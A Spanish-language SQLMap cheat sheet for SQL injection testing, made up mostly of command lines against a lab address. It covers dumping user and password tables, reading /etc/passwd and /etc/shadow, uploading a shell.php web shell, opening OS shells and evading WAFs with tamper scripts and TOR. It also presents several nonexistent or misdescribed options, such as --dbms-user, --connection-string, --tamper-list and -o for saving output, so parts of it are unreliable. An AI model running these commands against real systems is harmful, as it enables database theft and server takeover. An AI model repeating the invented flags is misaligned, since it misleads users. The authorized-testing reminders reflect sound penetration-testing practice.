# SQLMap Cheat Sheet

## Overview

SQLMap es una herramienta de pruebas de penetración de código abierto utilizada para:

- Detectar vulnerabilidades de inyección SQL.
- Explotar fallos de inyección SQL.
- Tomar el control de servidores de bases de datos.
- Volcar contenido de bases de datos.
- Llevar a cabo evaluaciones de seguridad autorizadas.

SQLMap proporciona:

- Detección automática de técnicas de inyección SQL.
- Soporte para múltiples sistemas de gestión de bases de datos.
- Capacidades de extracción de datos.
- Operaciones de lectura/escritura de archivos.
- Ejecución de comandos en el servidor de base de datos.

```text
Usa SQLMap únicamente contra sistemas que poseas o tengas autorización explícita para testear.
```

---

# 1. Starting SQLMap

## Sintaxis básica

```bash
sqlmap [options]
```

## Mostrar ayuda

```bash
sqlmap -h
```

## Mostrar versión

```bash
sqlmap --version
```

## Mostrar ayuda verbose

```bash
sqlmap -hh
```

## Actualizar SQLMap

```bash
sqlmap --update
```

Actualiza a la última versión del repositorio.

---

# 2. Target Specification

## Especificar URL objetivo

```bash
sqlmap -u <URL>
```

Ejemplo:

```bash
sqlmap -u "http://192.168.1.10/vuln.php?id=1"
```

## Especificar URL objetivo con parámetros

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1&name=test"
```

## Especificar petición POST

```bash
sqlmap -u <URL> --data <POST-data>
```

Ejemplo:

```bash
sqlmap -u "http://192.168.1.10/login.php" --data "username=admin&password=test"
```

## Especificar cookie

```bash
sqlmap -u <URL> --cookie <cookie>
```

Ejemplo:

```bash
sqlmap -u "http://192.168.1.10/admin.php" --cookie "PHPSESSID=abc123"
```

## Especificar User-Agent

```bash
sqlmap -u <URL> --user-agent <agent>
```

Ejemplo:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --user-agent "Mozilla/5.0"
```

## Especificar headers HTTP

```bash
sqlmap -u <URL> --headers <headers>
```

Ejemplo:

```bash
sqlmap -u "http://192.168.1.10/page.php" --headers "X-Forwarded-For: 127.0.0.1"
```

## Especificar proxy

```bash
sqlmap -u <URL> --proxy <proxy>
```

Ejemplo:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --proxy "http://127.0.0.1:8080"
```

## Especificar credenciales de proxy

```bash
sqlmap -u <URL> --proxy <proxy> --proxy-cred <credentials>
```

Ejemplo:

```bash
sqlmap -u "http://192.168.1.10/page.php" --proxy "http://127.0.0.1:8080" --proxy-cred "user:pass"
```

## Especificar proxy TOR

```bash
sqlmap -u <URL> --tor
```

## Especificar archivo de petición

```bash
sqlmap -r <request-file>
```

Ejemplo:

```bash
sqlmap -r request.txt
```

## Especificar múltiples objetivos

```bash
sqlmap -m <targets-file>
```

Donde `targets.txt` contiene una URL por línea.

---

# 3. Injection Detection

## Testear inyección SQL

```bash
sqlmap -u <URL>
```

Ejemplo:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1"
```

## Testear parámetro específico

```bash
sqlmap -u <URL> -p <parameter>
```

Ejemplo:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1&name=test" -p id
```

## Testear todos los parámetros

```bash
sqlmap -u <URL> --test-skip <parameter>
```

Salta parámetros específicos durante el testeo.

## Especificar técnica de inyección

Las técnicas incluyen:

- `B` - Boolean-based blind
- `E` - Error-based
- `U` - UNION query
- `S` - Stacked queries
- `T` - Time-based blind
- `Q` - Inline queries

```bash
sqlmap -u <URL> --technique <techniques>
```

Ejemplo:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --technique BEU
```

## Especificar nivel de riesgo

Niveles 1-3 (por defecto es 1):

- 1 - Tests básicos
- 2 - Añade tests time-based
- 3 - Añade tests OR-based

```bash
sqlmap -u <URL> --risk <level>
```

Ejemplo:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --risk 2
```

## Especificar nivel de tests

Niveles 1-5 (por defecto es 1):

- Niveles más altos testean más parámetros y cookies

```bash
sqlmap -u <URL> --level <level>
```

Ejemplo:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --level 3
```

## Saltar protección WAF/IPS

```bash
sqlmap -u <URL> --skip-waf
```

## Usar scripts tamper

```bash
sqlmap -u <URL> --tamper <script>
```

Ejemplo:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --tamper space2comment
```

---

# 4. Database Enumeration

## Listar todas las bases de datos

```bash
sqlmap -u <URL> --dbs
```

Ejemplo:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --dbs
```

## Listar tablas en la base de datos actual

```bash
sqlmap -u <URL> --tables
```

## Listar tablas en una base de datos específica

```bash
sqlmap -u <URL> -D <database> --tables
```

Ejemplo:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" -D testdb --tables
```

## Listar columnas en una tabla específica

```bash
sqlmap -u <URL> -D <database> -T <table> --columns
```

Ejemplo:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" -D testdb -T users --columns
```

## Volcar tabla específica

```bash
sqlmap -u <URL> -D <database> -T <table> --dump
```

Ejemplo:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" -D testdb -T users --dump
```

## Volcar todas las tablas

```bash
sqlmap -u <URL> -D <database> --dump-all
```

## Volcar columnas específicas

```bash
sqlmap -u <URL> -D <database> -T <table> -C <columns> --dump
```

Ejemplo:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" -D testdb -T users -C username,password --dump
```

## Contar entradas en una tabla

```bash
sqlmap -u <URL> -D <database> -T <table> --count
```

## Obtener schema de la base de datos

```bash
sqlmap -u <URL> --schema
```

## Obtener schema de una base de datos específica

```bash
sqlmap -u <URL> -D <database> --schema
```

---

# 5. User and Privilege Enumeration

## Listar usuarios de la base de datos

```bash
sqlmap -u <URL> --users
```

## Listar privilegios de usuario

```bash
sqlmap -u <URL> --privileges
```

## Listar privilegios de un usuario específico

```bash
sqlmap -u <URL> --privileges -U <username>
```

Ejemplo:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --privileges -U root
```

## Listar contraseñas de usuarios

```bash
sqlmap -u <URL> --passwords
```

## Obtener usuario actual

```bash
sqlmap -u <URL> --current-user
```

## Obtener base de datos actual

```bash
sqlmap -u <URL> --current-db
```

## Comprobar si el usuario es DBA

```bash
sqlmap -u <URL> --is-dba
```

## Listar roles

```bash
sqlmap -u <URL> --roles
```

---

# 6. Database System Information

## Obtener banner de la base de datos

```bash
sqlmap -u <URL> --banner
```

## Obtener hostname del servidor de base de datos

```bash
sqlmap -u <URL> --hostname
```

## Obtener dirección IP del servidor de base de datos

```bash
sqlmap -u <URL> --dns-name
```

## Obtener versión del servidor de base de datos

```bash
sqlmap -u <URL> --version
```

## Obtener SO del servidor de base de datos

```bash
sqlmap -u <URL> --os
```

## Obtener directorio de datos del servidor de base de datos

```bash
sqlmap -u <URL> --data-dir
```

---

# 7. File Operations

## Leer archivo del servidor de base de datos

```bash
sqlmap -u <URL> --file-read <remote-path>
```

Ejemplo:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --file-read "/etc/passwd"
```

## Escribir archivo en el servidor de base de datos

```bash
sqlmap -u <URL> --file-write <local-path> --file-dest <remote-path>
```

Ejemplo:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --file-write shell.php --file-dest "/var/www/html/shell.php"
```

## Leer múltiples archivos

```bash
sqlmap -u <URL> --file-read "/etc/passwd,/etc/shadow"
```

---

# 8. Command Execution

## Ejecutar comando del SO

```bash
sqlmap -u <URL> --os-cmd <command>
```

Ejemplo:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --os-cmd "whoami"
```

## Ejecutar comando del SO con output

```bash
sqlmap -u <URL> --os-cmd "id"
```

## Obtener shell del SO

```bash
sqlmap -u <URL> --os-shell
```

Proporciona una shell interactiva en el servidor de base de datos.

## Obtener shell SQL

```bash
sqlmap -u <URL> --sql-shell
```

Proporciona una shell SQL interactiva.

## Ejecutar comando PowerShell

```bash
sqlmap -u <URL> --os-cmd <powershell-command>
```

Ejemplo:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --os-cmd "powershell -c Get-Process"
```

---

# 9. Advanced Options

## Especificar sistema de gestión de base de datos

```bash
sqlmap -u <URL> --dbms <dbms>
```

Ejemplo:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --dbms mysql
```

DBMS soportados:

- MySQL
- PostgreSQL
- Oracle
- Microsoft SQL Server
- SQLite
- Microsoft Access
- IBM DB2
- SAP MaxDB
- Sybase
- Firebird

## Especificar usuario de base de datos

```bash
sqlmap -u <URL> --dbms-user <username>
```

## Especificar contraseña de base de datos

```bash
sqlmap -u <URL> --dbms-pass <password>
```

## Especificar puerto de base de datos

```bash
sqlmap -u <URL> --dbms-port <port>
```

Ejemplo:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --dbms-port 3306
```

## Especificar string de conexión

```bash
sqlmap -u <URL> --connection-string <string>
```

## Limitar número de entradas

```bash
sqlmap -u <URL> --dump -D <database> -T <table> --start <start> --stop <stop>
```

Ejemplo:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" -D testdb -T users --dump --start 1 --stop 10
```

## Primera entrada a recuperar

```bash
sqlmap -u <URL> --dump -D <database> -T <table> --first <entry>
```

## Última entrada a recuperar

```bash
sqlmap -u <URL> --dump -D <database> -T <table> --last <entry>
```

## Excluir columnas del volcado

```bash
sqlmap -u <URL> --dump -D <database> -T <table> --exclude-columns <columns>
```

## Buscar bases de datos específicas

```bash
sqlmap -u <URL> --dbs --search
```

## Buscar tablas específicas

```bash
sqlmap -u <URL> --tables --search
```

## Buscar columnas específicas

```bash
sqlmap -u <URL> --columns --search
```

---

# 10. Output and Logging

## Guardar output en archivo

```bash
sqlmap -u <URL> -o
```

## Especificar directorio de output

```bash
sqlmap -u <URL> --output-dir <directory>
```

## Output verbose

Niveles 0-6 (por defecto es 1):

```bash
sqlmap -u <URL> -v <level>
```

Ejemplo:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" -v 3
```

## Mostrar tráfico

```bash
sqlmap -u <URL> --traffic
```

## Mostrar peticiones HTTP

```bash
sqlmap -u <URL> --show-requests
```

## Analizar objetivos desde log de proxy Burp

```bash
sqlmap -u <URL> --log-file <burp-log>
```

## Flushear archivo de sesión

```bash
sqlmap -u <URL> --flush-session
```

## Guardar sesión

```bash
sqlmap -u <URL> --save-config <config-file>
```

## Cargar sesión

```bash
sqlmap -u <URL> --load-config <config-file>
```

---

# 11. Common Attack Scenarios

## Test básico de inyección SQL

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1"
```

## Enumerar bases de datos

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --dbs
```

## Volcar tabla users

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" -D testdb -T users --dump
```

## Obtener banner de la base de datos

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --banner
```

## Ejecutar comando del SO

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --os-cmd "whoami"
```

## Leer /etc/passwd

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --file-read "/etc/passwd"
```

## Obtener shell del SO

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --os-shell
```

## Inyección POST

```bash
sqlmap -u "http://192.168.1.10/login.php" --data "username=admin&password=test"
```

## Inyección en cookie

```bash
sqlmap -u "http://192.168.1.10/admin.php" --cookie "PHPSESSID=abc123"
```

## Inyección en header

```bash
sqlmap -u "http://192.168.1.10/page.php" --headers "X-Forwarded-For: 127.0.0.1"
```

## Proxy TOR

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --tor
```

## Usar script tamper

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --tamper space2comment
```

---

# 12. Practical Workflows

## Flujo de trabajo básico de inyección SQL

```text
1. Identificar la URL objetivo con parámetros.
2. Testear inyección SQL con SQLMap.
3. Enumerar bases de datos.
4. Enumerar tablas en la base de datos objetivo.
5. Enumerar columnas en la tabla objetivo.
6. Volcar contenido de la tabla.
7. Documentar hallazgos.
```

## Ejemplo: Enumeración completa

```bash
# Testear inyección SQL
sqlmap -u "http://192.168.1.10/page.php?id=1"

# Listar bases de datos
sqlmap -u "http://192.168.1.10/page.php?id=1" --dbs

# Listar tablas en la base de datos
sqlmap -u "http://192.168.1.10/page.php?id=1" -D testdb --tables

# Listar columnas en la tabla
sqlmap -u "http://192.168.1.10/page.php?id=1" -D testdb -T users --columns

# Volcar tabla
sqlmap -u "http://192.168.1.10/page.php?id=1" -D testdb -T users --dump
```

## Ejemplo: Inyección POST

```bash
# Testear parámetros POST
sqlmap -u "http://192.168.1.10/login.php" --data "username=admin&password=test"

# Enumerar bases de datos
sqlmap -u "http://192.168.1.10/login.php" --data "username=admin&password=test" --dbs

# Volcar tabla users
sqlmap -u "http://192.168.1.10/login.php" --data "username=admin&password=test" -D testdb -T users --dump
```

## Ejemplo: Inyección en cookie

```bash
# Testear parámetro de cookie
sqlmap -u "http://192.168.1.10/admin.php" --cookie "PHPSESSID=abc123"

# Enumerar bases de datos
sqlmap -u "http://192.168.1.10/admin.php" --cookie "PHPSESSID=abc123" --dbs
```

## Ejemplo: Operaciones de archivo

```bash
# Leer archivo del servidor
sqlmap -u "http://192.168.1.10/page.php?id=1" --file-read "/etc/passwd"

# Escribir archivo en el servidor
sqlmap -u "http://192.168.1.10/page.php?id=1" --file-write shell.php --file-dest "/var/www/html/shell.php"
```

## Ejemplo: Ejecución de comandos

```bash
# Ejecutar comando
sqlmap -u "http://192.168.1.10/page.php?id=1" --os-cmd "whoami"

# Obtener shell del SO
sqlmap -u "http://192.168.1.10/page.php?id=1" --os-shell
```

---

# 13. Common Commands Reference

| Command | Description |
|---|---|
| `sqlmap -h` | Mostrar ayuda |
| `sqlmap --version` | Mostrar versión |
| `sqlmap -u <URL>` | Especificar URL objetivo |
| `sqlmap -r <file>` | Especificar archivo de petición |
| `sqlmap --data <data>` | Especificar datos POST |
| `sqlmap --cookie <cookie>` | Especificar cookie |
| `sqlmap --dbs` | Listar todas las bases de datos |
| `sqlmap --tables` | Listar tablas |
| `sqlmap --columns` | Listar columnas |
| `sqlmap --dump` | Volcar contenido de tabla |
| `sqlmap --banner` | Obtener banner de la base de datos |
| `sqlmap --current-user` | Obtener usuario actual |
| `sqlmap --current-db` | Obtener base de datos actual |
| `sqlmap --users` | Listar usuarios de la base de datos |
| `sqlmap --passwords` | Listar contraseñas |
| `sqlmap --privileges` | Listar privilegios |
| `sqlmap --file-read <path>` | Leer archivo del servidor |
| `sqlmap --file-write <file>` | Escribir archivo en el servidor |
| `sqlmap --os-cmd <cmd>` | Ejecutar comando del SO |
| `sqlmap --os-shell` | Obtener shell del SO |
| `sqlmap --sql-shell` | Obtener shell SQL |
| `sqlmap --tamper <script>` | Usar script tamper |
| `sqlmap --tor` | Usar proxy TOR |
| `sqlmap --proxy <proxy>` | Usar proxy |
| `sqlmap -v <level>` | Establecer nivel de verbosidad |
| `sqlmap --level <level>` | Establecer nivel de test |
| `sqlmap --risk <level>` | Establecer nivel de riesgo |
| `sqlmap --technique <tech>` | Establecer técnica de inyección |
| `sqlmap --dbms <dbms>` | Especificar DBMS |
| `sqlmap --update` | Actualizar SQLMap |

---

# 14. Tamper Scripts

## Listar scripts tamper disponibles

```bash
sqlmap --tamper-list
```

## Scripts tamper comunes

- `space2comment` - Reemplaza espacio con `/**/`
- `space2dash` - Reemplaza espacio con `--`
- `space2hash` - Reemplaza espacio con `#`
- `space2plus` - Reemplaza espacio con `+`
- `space2randomblank` - Reemplaza espacio con espacio aleatorio
- `between` - Reemplaza `>` con `NOT BETWEEN 0 AND #`
- `charencode` - URL-encodea todos los caracteres
- `equaltolike` - Reemplaza `=` con `LIKE`
- `lowercase` - Convierte a minúsculas
- `uppercase` - Convierte a mayúsculas
- `randomcase` - Randomiza el caso
- `base64encode` - Codifica payload en Base64

## Usar script tamper

```bash
sqlmap -u <URL> --tamper <script>
```

Ejemplo:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --tamper space2comment
```

## Usar múltiples scripts tamper

```bash
sqlmap -u <URL> --tamper <script1>,<script2>
```

Ejemplo:

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --tamper space2comment,base64encode
```

---

# 15. Database-Specific Options

## MySQL

```bash
sqlmap -u <URL> --dbms mysql
```

## PostgreSQL

```bash
sqlmap -u <URL> --dbms postgresql
```

## Oracle

```bash
sqlmap -u <URL> --dbms oracle
```

## Microsoft SQL Server

```bash
sqlmap -u <URL> --dbms mssql
```

## SQLite

```bash
sqlmap -u <URL> --dbms sqlite
```

## Microsoft Access

```bash
sqlmap -u <URL> --dbms access
```

## IBM DB2

```bash
sqlmap -u <URL> --dbms db2
```

## SAP MaxDB

```bash
sqlmap -u <URL> --dbms maxdb
```

## Sybase

```bash
sqlmap -u <URL> --dbms sybase
```

## Firebird

```bash
sqlmap -u <URL> --dbms firebird
```

---

# 16. Troubleshooting

## No se detecta inyección SQL

- Prueba diferentes parámetros.
- Aumenta el nivel: `--level 3`
- Aumenta el riesgo: `--risk 2`
- Usa scripts tamper.
- Testea manualmente con diferentes payloads.

## WAF/IPS bloqueando

- Usa scripts tamper.
- Usa `--skip-waf`.
- Usa proxy o TOR.
- Ralentiza las peticiones: `--delay 1`
- Usa User-Agent aleatorio: `--random-agent`

## Rendimiento lento

- Reduce el nivel: `--level 1`
- Reduce el riesgo: `--risk 1`
- Limita entradas: `--start 1 --stop 10`
- Usa técnicas específicas: `--technique B`

## Errores de conexión

- Comprueba la URL objetivo.
- Verifica la conectividad de red.
- Comprueba la configuración del proxy.
- Aumenta el timeout: `--timeout 30`

## Falsos positivos

- Verifica la inyección manualmente.
- Usa diferentes técnicas.
- Comprueba los códigos de respuesta.
- Revisa el output de SQLMap cuidadosamente.

---

# 17. Security Best Practices

## Verifica siempre los hallazgos

- Testea la inyección manualmente.
- Verifica el contenido de la base de datos.
- Comprueba falsos positivos.
- Documenta todos los hallazgos.

## Respeta los límites legales

- Testea solo sistemas que poseas.
- Obtén autorización explícita.
- Sigue la divulgación responsable.
- Documenta todas las actividades.

## Mantén un entorno de laboratorio

- Usa máquinas virtuales.
- Aísla las redes de test.
- Mantén snapshots limpios.
- Documenta configuraciones.

## Mantén las herramientas actualizadas

- Actualiza SQLMap regularmente.
- Mantente informado sobre nuevas técnicas.
- Sigue advisories de seguridad.
- Testea en entornos controlados.

## Minimiza el impacto

- Usa el nivel de riesgo más bajo posible.
- Limita la extracción de datos.
- Evita operaciones destructivas.
- Testea durante ventanas de mantenimiento.

---

# 18. Important Reminders

- Obtén siempre autorización explícita antes de usar SQLMap.
- Testea primero en un entorno de laboratorio controlado.
- No todas las inyecciones detectadas son explotables.
- Algunas operaciones pueden impactar el rendimiento de la base de datos.
- Mantén SQLMap actualizado regularmente.
- Valida los hallazgos manualmente; no confíes únicamente en resultados automatizados.
- Documenta todas las acciones, comandos y resultados.
- Preserva la evidencia original y los logs.
- Respeta el scope y las reglas del engagement.
- Entiende las implicaciones legales y éticas de tus acciones.

---

# 19. Quick Reference Examples

## Test básico

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1"
```

## Listar bases de datos

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --dbs
```

## Listar tablas

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --tables
```

## Volcar tabla

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" -D testdb -T users --dump
```

## Obtener banner

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --banner
```

## Ejecutar comando

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --os-cmd "whoami"
```

## Obtener shell del SO

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --os-shell
```

## Inyección POST

```bash
sqlmap -u "http://192.168.1.10/login.php" --data "username=admin&password=test"
```

## Usar tamper

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --tamper space2comment
```

## Usar TOR

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --tor
```

## Output verbose

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" -v 3
```

## Test de nivel alto

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --level 3 --risk 2
```

---

# 20. Additional Resources

## Documentación oficial de SQLMap

```text
https://sqlmap.org/
```

## Repositorio GitHub de SQLMap

```text
https://github.com/sqlmapproject/sqlmap
```

## Wiki de SQLMap

```text
https://github.com/sqlmapproject/sqlmap/wiki
```

## OWASP SQL Injection

```text
https://owasp.org/www-community/attacks/SQL_Injection
```

## PortSwigger SQL Injection

```text
https://portswigger.net/web-security/sql-injection
```
